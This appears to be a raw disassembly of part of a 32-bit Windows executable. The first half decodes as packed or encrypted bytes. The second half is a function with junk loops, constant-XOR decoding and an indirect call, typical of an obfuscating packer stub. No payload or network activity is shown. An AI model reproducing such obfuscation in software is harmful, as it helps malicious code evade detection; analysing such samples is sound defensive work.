  406a3e:	and    DWORD PTR [eax-0xf5641a5],ecx
  406a44:	iret   
  406a45:	sbb    cl,BYTE PTR [edx]
  406a47:	arpl   bp,bx
  406a49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a4a:	pop    ds
  406a4b:	cmc    
  406a4c:	sbb    al,0xf0
  406a4e:	je     0x406a33
  406a50:	cmp    ebx,ebp
  406a52:	push   ecx
  406a53:	pop    ss
  406a54:	mov    ecx,ebx
  406a56:	fidivr WORD PTR [edx-0x780c08b8]
  406a5c:	ins    DWORD PTR es:[edi],dx
  406a5d:	and    DWORD PTR [edi+edx*1-0x6b],0xffffff9d
  406a62:	cdq    
  406a63:	xchg   ebx,eax
  406a64:	xor    eax,0x1952f19b
  406a69:	test   BYTE PTR [esi+edx*8-0x19],dl
  406a6d:	mov    ebx,0x2d8089c0
  406a72:	out    0xe4,eax
  406a74:	push   ds
  406a75:	pop    ds
  406a76:	inc    ebx
  406a77:	loop   0x406a6c
  406a79:	dec    edx
  406a7a:	or     ebx,DWORD PTR [ebx+0x56]
  406a7d:	inc    edx
  406a7e:	push   cs
  406a7f:	mov    eax,ds:0x9647319
  406a84:	xor    DWORD PTR [ecx],eax
  406a86:	or     bl,ch
  406a88:	lahf   
  406a89:	xor    eax,0x23320c95
  406a8e:	mov    ah,0x1a
  406a90:	cmp    DWORD PTR [ecx-0x385e83bc],eax
  406a96:	mov    BYTE PTR [edx+0x2a],dl
  406a99:	bound  esp,QWORD PTR [esi+0x2894f6e1]
  406a9f:	fimul  DWORD PTR [edi+0x3258048e]
  406aa5:	mov    al,0x7e
  406aa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406aa8:	push   es
  406aa9:	mov    cl,0x30
  406aab:	jns    0x406a8d
  406aad:	jno    0x406b05
  406aaf:	out    dx,eax
  406ab0:	adc    DWORD PTR [ebx+0x4b],edx
  406ab3:	and    ah,BYTE PTR [ebx+eax*2+0x61]
  406ab7:	test   al,0xc5
  406ab9:	adc    DWORD PTR [ebp+0x38381d79],0x283941
  406ac3:	pop    edi
  406ac4:	xor    eax,0xf09fcbb
  406ac9:	add    al,0x2b
  406acb:	div    BYTE PTR [edx]
  406acd:	push   ebx
  406ace:	xchg   edi,eax
  406acf:	or     al,0x42
  406ad2:	and    DWORD PTR ds:0x12cdd417,0x611fa9d5
  406adc:	pop    ss
  406add:	jge    0x406b09
  406adf:	div    cl
  406ae1:	mov    cl,0x9a
  406ae3:	in     al,dx
  406ae4:	and    BYTE PTR [edx],0xd6
  406ae7:	cli    
  406ae8:	xchg   ebx,eax
  406ae9:	cmc    
  406aea:	ins    DWORD PTR es:[edi],dx
  406aeb:	in     al,dx
  406aec:	fcmove st,st(3)
  406aee:	push   esp
  406aef:	xchg   edi,eax
  406af0:	ret    0x24f7
  406af3:	test   DWORD PTR [eax+0x31d87fd8],eax
  406af9:	and    ecx,esi
  406afb:	mov    BYTE PTR [ecx+ebp*1-0x6a],al
  406aff:	sub    al,0xd9
  406b02:	jl     0x406b4f
  406b04:	popa   
  406b05:	fs (bad) 
  406b07:	jno    0x406b56
  406b09:	sub    BYTE PTR [eax],al
  406b0b:	retf   0x8308
  406b0e:	and    al,0x5b
  406b10:	test   al,0xa7
  406b12:	jno    0x406ae7
  406b14:	jg     0x406b1c
  406b16:	loopne 0x406b47
  406b18:	lea    ebp,[esi+0x67]
  406b1b:	jnp    0x406b98
  406b1d:	ds dec edx
  406b1f:	stos   BYTE PTR es:[edi],al
  406b20:	pushf  
  406b21:	mov    eax,0x7ddb9363
  406b26:	shl    DWORD PTR [eax+0x17fe060],0xc9
  406b2d:	in     eax,0xe9
  406b2f:	sti    
  406b30:	call   0x9ff2:0xa8d32870
  406b37:	inc    DWORD PTR [ecx-0xb88852d]
  406b3d:	bound  eax,QWORD PTR [ebx+0x5bca7924]
  406b43:	dec    ecx
  406b44:	inc    ebx
  406b45:	dec    ebx
  406b46:	or     BYTE PTR [esi-0x5cfc2515],dh
  406b4c:	out    dx,al
  406b4d:	xchg   ecx,eax
  406b4e:	cmp    bh,BYTE PTR [ebx-0x55]
  406b51:	ret    
  406b52:	std    
  406b53:	pop    edx
  406b54:	xchg   esi,eax
  406b55:	mov    ebx,0xee1ece42
  406b5a:	mov    bh,0x4c
  406b5c:	scas   al,BYTE PTR es:[edi]
  406b5d:	aas    
  406b5e:	mov    bl,0xb4
  406b60:	fistp  WORD PTR [edx-0x1486aba2]
  406b66:	mov    esi,0xff893390
  406b6b:	repnz popa 
  406b6d:	popf   
  406b6e:	int    0x67
  406b70:	(bad)  
  406b71:	jmp    0xc7ce3343
  406b76:	sbb    ah,dl
  406b78:	fisub  DWORD PTR [edi]
  406b7a:	lds    ecx,FWORD PTR [eax+0x3]
  406b7d:	mov    ebp,0x96ceb17f
  406b82:	mov    edi,0x2052ebbf
  406b87:	out    dx,eax
  406b88:	inc    ebp
  406b89:	push   cs
  406b8a:	dec    esi
  406b8b:	jns    0x406b88
  406b8d:	sub    BYTE PTR [eax-0x2a],ah
  406b90:	lods   eax,DWORD PTR ds:[esi]
  406b91:	push   esi
  406b92:	xlat   BYTE PTR ds:[ebx]
  406b93:	mov    bh,0x32
  406b95:	cdq    
  406b96:	jg     0x406bde
  406b98:	add    eax,0xf44ad3ea
  406b9d:	and    al,0x9c
  406b9f:	cmp    edi,ebp
  406ba1:	shl    DWORD PTR [eax-0x2ed8c74f],cl
  406ba7:	aad    0x30
  406ba9:	ss call 0xcfacf516
  406baf:	sbb    bh,BYTE PTR [eax+0xe]
  406bb2:	xchg   esp,eax
  406bb3:	enter  0x2444,0x34
  406bb7:	or     DWORD PTR [ebp-0x80],ebp
  406bba:	hlt    
  406bbb:	mov    ch,0xef
  406bbd:	mov    ch,0xd1
  406bbf:	daa    
  406bc0:	inc    edi
  406bc1:	lea    esi,[ebx-0x23]
  406bc4:	ins    DWORD PTR es:[edi],dx
  406bc5:	mov    edx,0xbddc6e35
  406bca:	mov    al,0x6f
  406bcc:	into   
  406bcd:	xchg   ebx,eax
  406bce:	shl    DWORD PTR [ebp-0x30d36b18],cl
  406bd4:	ret    
  406bd5:	xchg   ebp,eax
  406bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bd7:	cmp    ebp,DWORD PTR [esp+ecx*2-0x23]
  406bdb:	sbb    bl,BYTE PTR [ebx]
  406bdd:	test   edx,ecx
  406bdf:	data16 add BYTE PTR [esp+ecx*2],bl
  406be3:	add    dh,BYTE PTR [ebx-0x2e545c57]
  406be9:	inc    edi
  406bea:	dec    ecx
  406beb:	leave  
  406bec:	outs   dx,DWORD PTR ds:[esi]
  406bed:	addr16 dec ebp
  406bef:	push   ebx
  406bf0:	jg     0x406bf6
  406bf2:	retf   0x9cae
  406bf5:	jecxz  0x406bae
  406bf7:	in     al,dx
  406bf8:	sub    esp,DWORD PTR [eax+0x2a]
  406bfb:	xlat   BYTE PTR ds:[ebx]
  406bfc:	inc    ecx
  406bfd:	scas   al,BYTE PTR es:[edi]
  406bfe:	stc    
  406bff:	or     BYTE PTR [ecx+0x62144e7c],al
  406c05:	in     eax,0xa
  406c07:	lock xchg edx,eax
  406c09:	nop
  406c0a:	aas    
  406c0b:	pop    ds
  406c0c:	test   BYTE PTR [edi],ah
  406c0e:	sub    BYTE PTR [esi+0x79672ac1],bl
  406c14:	jns    0x406be2
  406c16:	stos   DWORD PTR es:[edi],eax
  406c17:	pop    edi
  406c18:	js     0x406b9a
  406c1a:	xor    al,0xca
  406c1c:	test   BYTE PTR [ebp-0x2d2e6725],bh
  406c22:	pop    ebp
  406c23:	xchg   edx,eax
  406c24:	dec    edi
  406c25:	cmp    DWORD PTR [ecx-0x79bedb18],edi
  406c2b:	sbb    BYTE PTR [edx-0x3],cl
  406c2e:	jecxz  0x406c2e
  406c30:	gs mov ch,0x6a
  406c33:	mov    ah,0xa7
  406c35:	dec    ebx
  406c36:	jp     0x406c4b
  406c38:	cmp    al,0x9e
  406c3a:	inc    ebp
  406c3b:	jmp    0xad9660f2
  406c40:	mov    dh,0x4d
  406c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c43:	pop    ecx
  406c44:	xchg   esp,eax
  406c45:	cdq    
  406c46:	mov    edx,0xfa90490
  406c4b:	test   BYTE PTR [edx+eax*1+0x35ff0000],bl
  406c52:	mov    dh,0x3c
  406c54:	inc    ecx
  406c55:	add    bh,bh
  406c57:	xor    eax,0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0xf3a52bde
  406c81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c82:	inc    edi
  406c84:	ret    0x7e7e
  406c87:	fistp  QWORD PTR [esi+edi*2+0x7e]
  406c8b:	push   eax
  406c8c:	add    BYTE PTR [esi],ah
  406c8e:	sub    DWORD PTR [ecx],edx
  406c90:	push   eax
  406c91:	jno    0x406c54
  406c93:	scas   al,BYTE PTR es:[edi]
  406c94:	jae    0x406c23
  406c96:	xchg   ecx,eax
  406c97:	push   cs
  406c98:	fisttp WORD PTR [ecx*2-0x2c407092]
  406c9f:	inc    esp
  406ca0:	add    edx,DWORD PTR [esi]
  406ca2:	popf   
  406ca3:	pop    ss
  406ca4:	dec    ebp
  406ca5:	ins    BYTE PTR es:[edi],dx
  406ca6:	and    eax,0x1d91e0e
  406cab:	xlat   BYTE PTR ds:[ebx]
  406cac:	cdq    
  406cad:	mov    edx,DWORD PTR [edi-0x586f5edc]
  406cb3:	dec    eax
  406cb4:	aam    0x65
  406cb6:	sbb    eax,0x6f89338e
  406cbb:	push   ecx
  406cbc:	or     eax,0xdc06daf1
  406cc1:	pop    ds
  406cc2:	ins    DWORD PTR es:[edi],dx
  406cc3:	pop    eax
  406cc4:	(bad)  
  406cc5:	not    al
  406cc7:	outs   dx,DWORD PTR ds:[esi]
  406cc8:	retf   
  406cc9:	cmp    al,0x73
  406ccb:	jp     0x406c83
  406ccd:	sub    al,BYTE PTR ds:0xfdbf89e2
  406cd3:	cmp    DWORD PTR [ecx],edi
  406cd5:	mov    ah,0x22
  406cd7:	mov    WORD PTR [esi],?
  406cd9:	jb     0x406d18
  406cdb:	cli    
  406cdc:	xchg   ebp,eax
  406cdd:	mov    ds,WORD PTR ds:0x43d791dd
  406ce3:	(bad)  [esi+ecx*4]
  406ce6:	dec    eax
  406ce7:	retf   0xeee4
  406cea:	jmp    0xc7f0435d
  406cef:	inc    edx
  406cf0:	adc    DWORD PTR [ebx+0x5d4f43ec],eax
  406cf6:	in     al,0x8e
  406cf8:	xor    ah,BYTE PTR [ebx+0x44]
  406cfb:	cmp    DWORD PTR [ecx],edx
  406cfd:	addr16 sub eax,0xdedcea4b
  406d03:	mov    edi,0xffe6d1e6
  406d08:	arpl   WORD PTR [eax-0x1ee2304e],bx
  406d0e:	loopne 0x406cb5
  406d10:	or     eax,0xf3c87dff
  406d15:	test   eax,0xb56d5ad5
  406d1a:	xor    DWORD PTR [edx-0xa],0x2e6ffd06
  406d21:	push   esp
  406d22:	push   ebx
  406d23:	test   BYTE PTR [edx+0x6cd67e0b],0x21
  406d2a:	mov    DWORD PTR [ecx],0x40a0f031
  406d30:	out    dx,eax
  406d31:	ss cli 
  406d33:	scas   eax,DWORD PTR es:[edi]
  406d34:	mov    edx,eax
  406d36:	in     al,dx
  406d37:	in     al,dx
  406d38:	sbb    DWORD PTR [edi],edx
  406d3a:	mov    ah,0x48
  406d3c:	mov    cl,0xf4
  406d3e:	push   0x53
  406d40:	iret   
  406d41:	fisub  DWORD PTR [ebp-0x26213f37]
  406d47:	std    
  406d48:	fwait
  406d49:	xor    al,0x0
  406d4b:	repz sti 
  406d4d:	push   ss
  406d4e:	mov    ecx,0xfec14c95
  406d53:	mov    al,0xa9
  406d55:	cmp    ecx,edx
  406d57:	xchg   edx,eax
  406d58:	dec    ecx
  406d59:	(bad)  
  406d5a:	jecxz  0x406d58
  406d5c:	loop   0x406dc9
  406d5e:	jbe    0x406cec
  406d60:	jns    0x406dae
  406d62:	or     esp,eax
  406d64:	mov    cl,0x32
  406d66:	jg     0x406d91
  406d68:	mov    dl,0xb6
  406d6a:	ret    
  406d6b:	jo     0x406d06
  406d6d:	aaa    
  406d6e:	xchg   edi,eax
  406d6f:	div    BYTE PTR [edi+0x3297541d]
  406d75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d76:	pop    ss
  406d77:	aad    0x2a
  406d79:	pop    ss
  406d7a:	loop   0x406cff
  406d7c:	pop    edx
  406d7d:	sbb    al,BYTE PTR [eax+edi*8-0x24]
  406d81:	add    cl,BYTE PTR [eax-0x42]
  406d84:	adc    esi,DWORD PTR [ebx+edi*8+0x5b]
  406d88:	rol    DWORD PTR [eiz*4-0x13dee1f7],1
  406d8f:	outs   dx,BYTE PTR ds:[esi]
  406d90:	dec    ecx
  406d91:	inc    esp
  406d92:	pop    es
  406d93:	xchg   ecx,eax
  406d94:	sar    DWORD PTR [edi-0x4e43232d],0x4
  406d9b:	cwde   
  406d9c:	xchg   ch,al
  406d9e:	sub    BYTE PTR [edi],ah
  406da0:	mov    bl,0xc0
  406da2:	aas    
  406da3:	dec    ebp
  406da4:	pop    ebp
  406da5:	jb     0x406d33
  406da7:	scas   al,BYTE PTR es:[edi]
  406da8:	sbb    al,0xb0
  406daa:	mov    ds:0x3678651f,eax
  406daf:	std    
  406db0:	test   al,0xc3
  406db2:	sbb    ah,BYTE PTR [edx]
  406db4:	inc    esp
  406db5:	iret   
  406db6:	xor    al,0xb5
  406db8:	or     BYTE PTR [edx],al
  406dba:	ins    BYTE PTR es:[edi],dx
  406dbb:	xor    ch,BYTE PTR [esi+0x69]
  406dbe:	call   0xa280:0xa518cf4c
  406dc5:	cmc    
  406dc6:	lahf   
  406dc7:	div    BYTE PTR [ecx]
  406dc9:	add    al,0x1f
  406dcb:	sbb    edx,DWORD PTR [eax]
  406dcd:	cmp    cl,0x15
  406dd0:	mov    cs,eax
  406dd2:	add    BYTE PTR [esi-0xd],cl
  406dd5:	call   0x1cd1:0x252e78b5
  406ddc:	and    bh,BYTE PTR ds:0x763aefe8
  406de2:	lea    esp,[esi-0x3e]
  406de5:	test   DWORD PTR [ebx+0x44],ebx
  406de8:	push   esi
  406de9:	outs   dx,BYTE PTR ds:[esi]
  406dea:	mov    ds:0x6c67d161,al
  406def:	addr16 idiv bh
  406df2:	push   edi
  406df3:	push   ebp
  406df4:	test   eax,0xd65929b8
  406df9:	push   esp
  406dfa:	fcmovu st,st(6)
  406dfc:	ins    DWORD PTR es:[edi],dx
  406dfd:	fnstsw WORD PTR [edx+0x626bc5d2]
  406e03:	adc    eax,0x56c942e8
  406e08:	mov    al,ds:0x6697d0b2
  406e0d:	imul   ax,WORD PTR [edi+0x57eee8e4],0xd472
  406e16:	sbb    bh,cl
  406e18:	fwait
  406e19:	ss mov dh,0x80
  406e1c:	pop    es
  406e1d:	daa    
  406e1e:	push   esi
  406e1f:	shr    BYTE PTR [edi+0x1a],0x8a
  406e23:	stos   BYTE PTR es:[edi],al
  406e24:	jne    0x406ddb
  406e26:	or     DWORD PTR [ebp-0x40],0x52
  406e2a:	inc    eax
  406e2b:	dec    edx
  406e2c:	(bad)  
  406e2d:	int3   
  406e2e:	cmp    al,0x69
  406e30:	mov    esp,0x318a68a2
  406e35:	outs   dx,DWORD PTR ds:[esi]
  406e36:	arpl   bx,cx
  406e38:	je     0x406dec
  406e3a:	(bad)  
  406e3b:	stos   DWORD PTR es:[edi],eax
  406e3c:	test   edx,esp
  406e3e:	sub    al,BYTE PTR [ebx+0x4d]
  406e41:	mov    al,0x2b
  406e43:	sbb    cl,BYTE PTR [ecx]
  406e45:	lea    ebx,[eax+0x7896f9bd]
  406e4b:	mov    edx,0x73826ad6
  406e50:	push   esi
  406e51:	cwde   
  406e52:	outs   dx,BYTE PTR ds:[esi]
  406e53:	es daa 
  406e55:	cmp    edx,DWORD PTR [edx]
  406e57:	xchg   esi,eax
  406e58:	mov    bh,ch
  406e5a:	mov    bl,ah
  406e5c:	xchg   ebp,eax
  406e5d:	dec    esp
  406e5e:	aam    0xfd
  406e60:	dec    ecx
  406e61:	inc    eax
  406e62:	mov    ebp,0x55b308ed
  406e67:	jne    0x406eb9
  406e69:	dec    edx
  406e6a:	jp     0x406eb7
  406e6c:	test   DWORD PTR [edx-0x32d364e8],esp
  406e72:	fdivr  DWORD PTR [esi]
  406e74:	imul   BYTE PTR [ebp+ecx*4-0x11]
  406e78:	jnp    0x406e89
  406e7a:	retf   0x5c7a
  406e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e7e:	push   esp
  406e7f:	mov    DWORD PTR ss:[eax+0x4374388f],esp
  406e86:	cmp    eax,0x4d3474e2
  406e8b:	ret    
  406e8c:	xchg   ecx,eax
  406e8d:	test   eax,0xffacbc85
  406e92:	dec    edi
  406e93:	mov    bh,0x5b
  406e95:	inc    edi
  406e96:	dec    ebx
  406e97:	mov    eax,ds:0x9d9b7071
  406e9c:	daa    
  406e9d:	loopne 0x406ed4
  406e9f:	aad    0x21
  406ea1:	sbb    al,0xe8
  406ea3:	push   ebp
  406ea4:	test   DWORD PTR [ebp+0x1e8c1c2e],edx
  406eaa:	jp     0x406f04
  406eac:	sar    BYTE PTR [edx+0x39],cl
  406eaf:	jmp    0x406e9e
  406eb1:	mov    ecx,0x9a15011
  406eb6:	retf   
  406eb7:	jne    0x406e62
  406eb9:	mov    dl,0x0
  406ebb:	cmc    
  406ebc:	sar    DWORD PTR [edx+0xe76efdc],1
  406ec2:	pop    eax
  406ec3:	xor    esp,DWORD PTR [edx-0x2a]
  406ec6:	sub    al,0x91
  406ec8:	or     eax,0x56f60b80
  406ecd:	mov    edx,0xf96cbec7
  406ed2:	add    BYTE PTR [ebx-0x3b205bc5],ch
  406ed8:	push   es
  406ed9:	cmp    BYTE PTR [edx-0x43],bh
  406edc:	jmp    0x564c:0x10d37987
  406ee3:	mov    bl,ch
  406ee5:	lods   eax,DWORD PTR ds:[esi]
  406ee6:	fsubp  st(5),st
  406ee8:	cmc    
  406ee9:	xlat   BYTE PTR ds:[ebx]
  406eea:	mov    dh,0x38
  406eec:	mov    eax,DWORD PTR [ebp+0x10]
  406eef:	leave  
  406ef0:	ret    0xc
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43376f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433723,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43382f,0x433713
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43382f,0x4337a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4337eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4337bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433827
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4337fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4337fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4337fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433867
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4337fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4337fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4337fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4337fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4337fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43372b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433773,0x15
  406fee:	cmp    DWORD PTR ds:0x433773,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433773,0x2
  407002:	jne    0x40701d
  407008:	push   0x43377b
  40700d:	push   0x433803
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433773,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433773
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433773,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433773
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433773,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4337ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43372f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43372f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43372f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43372f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43372f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43372f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433747
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4337b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433733,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43376f,0x433727
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43371f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4337a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4337a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4337a7,ebx
  407108:	cmp    DWORD PTR ds:0x4337a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4337a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4337a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4337a7,ebx
  407144:	cmp    DWORD PTR ds:0x4337a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4337eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43371b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433843,0x1c
  407175:	cmp    DWORD PTR ds:0x433843,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433843,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43389a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433843
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433843,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43371f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43371f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43371f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43371f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43371f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43371f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43371f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43371f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433783,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433783
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433783,ebx
  407226:	cmp    DWORD PTR ds:0x433783,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433783,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433783
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433783,ebx
  40725e:	cmp    DWORD PTR ds:0x433783,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43372f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43371f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4337f7,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
